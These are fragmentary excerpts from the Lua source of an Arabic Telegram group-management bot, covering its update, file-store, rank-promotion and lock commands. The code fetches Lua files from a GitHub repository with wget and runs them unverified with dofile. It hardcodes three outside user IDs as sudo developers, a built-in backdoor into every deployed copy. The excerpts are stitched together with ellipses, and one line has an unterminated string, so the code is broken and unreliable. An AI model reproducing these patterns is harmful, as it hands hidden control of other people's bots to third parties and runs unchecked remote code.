...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/ahmedsiria/taiger/master/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1811126101,1817744757,1267379180}   
...
if tonumber(user_id) == tonumber(1811126101) then  
var = true  
elseif tonumber(user_id) == tonumber(1817744757) then
var = true  
elseif tonumber(user_id) == tonumber(1267379180) then
var = true
...
os.execute('wget https://raw.githubusercontent.com/ahmedsiria/taiger/master/BOYKA.lua')
send(msg.chat_id_, msg.id_,' ✪ تم تحديث السورس \n ✪ لديك اخر اصدار ل𝑺𝑶𝑼𝑹𝑪𝑬 𝑳𝑰𝑳 𓏴  \n ✪ الاصدار » { 1.3v}')
dofile('BOYKA.lua')  
end
if text == 'الاصدار ✪' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ✪ اصدار 𝑺𝑶𝑼𝑹𝑪𝑬 𝑳𝑰𝑳 𓏴   \n ✪ الاصدار »{ 1.3v}')
end
if text == 'قناه تحديثات البوت ✪' and SudoBot(msg) then 
database:del(bot_id..'Srt:Bot') 
send(msg.chat_id_, msg.id_,' ✪ [تحديثات البوت](t.me/alaziza1) \n ✪ [قناه السورس](t.me/Ziko20011)')
end
...
usertext = '\n ✪ العضو » ['..result.title_..'](t.me/'..(username or 'Ziko20011')..')'
status  = '\n ✪ تم ترقيته مطور'
...
usertext = '\n ✪ العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Ziko20011')..')'
status  = '\n ✪ تم ترقيته مطور'
...
if BOYKA1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✪ العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Ziko20011')..') \n ✪ '..BOYKA1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
send(msg.chat_id_,0," ✪ العضو : {["..data.first_name_.."](T.ME/Ziko20011)}\n ✪ ["..BOYKA_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ✪ عذرا » {["..data.first_name_.."](T.ME/Ziko20011)}\n ✪ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
{{text = '𝚉𝙸𝙺𝙾 𖤐🇦🇩',url="t.me/Zikoo9"}},  
  {{text = '👉🏻ᵛ͢ᵎᵖ 𝐄𝐋𝐀𝐆𝐍𝐁𝐄𝐘 🇦🇩 ؛',url="t.me/dogary111"}},
{{text = '𓆩 𝒔𝒐𝒖𝒓𝒄𝒆 𝚉𝙸𝙺𝙾 𖤐🇦🇩 𓆪', url="t.me/Ziko20011"}},  
}  
local msg_id = msg.id_/2097152/0.5  
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/Ziko20011&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ✪ بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'Ziko20011')..') \n ✪ تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ✪ بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Ziko20011')..') \n ✪ تـم قفـل التاك بالكتم ')
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/ahmedsiria/taiger/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ✪ اهلا بك في متجر ملفات الجارح\n ✪ ملفات السورس ↓\n◎ ══════ ❈ ══════ ◎\n\n"
local TextE = "\n◎ ══════ ❈ ══════ ◎\n ✪ علامة تعني { ✓ } ملف مفعل\n ✪ علامة تعني { ✘ } ملف معطل\n ✪ قناة 𝑺𝑶𝑼𝑹𝑪𝑬 𝑳𝑰𝑳 𓏴   ↓\n".." ✪ [اضغط هنا لدخول](t.me/Ziko20011) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/ahmedsiria/taiger/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('BOYKA.lua')  
else
send(msg.chat_id_, msg.id_," ✪ عذرا الملف لايدعم 𝑺𝑶𝑼𝑹𝑪𝑬 𝑳𝑰𝑳 𓏴   \n") 
end
return false
end
...
local UserName = (b.username_ or "Ziko20011")
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ✪ لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Ziko20011')..')'
status  = '\n ✪ تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ✪ العضو » '..userid..''
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ✪ العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Ziko20011')..')'..'\n ✪ تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if text == 'زيكوو' or text == 'زيكو' or text == 'س' then
local Text = [[
𓆩 اقـــمــــد مــن الـــقــمــدان يـــآروحـــي 𓆪
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'الكبير زيكوو',url="t.me/Zikoo9"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "بوت" or text == 'البوت' then
local Namebot = (database:get(bot_id..'Name:Bot') or 'زيكو)
local DRAGON_Msg = {
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'Ziko20011')..')'
local iduser = result.sender_user_id_
...
{
{text = '𝑺𝑶𝑼𝑹𝑪𝑬 𝑳𝑰𝑳 𓏴   ', url="t.me/Ziko20011"},
},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
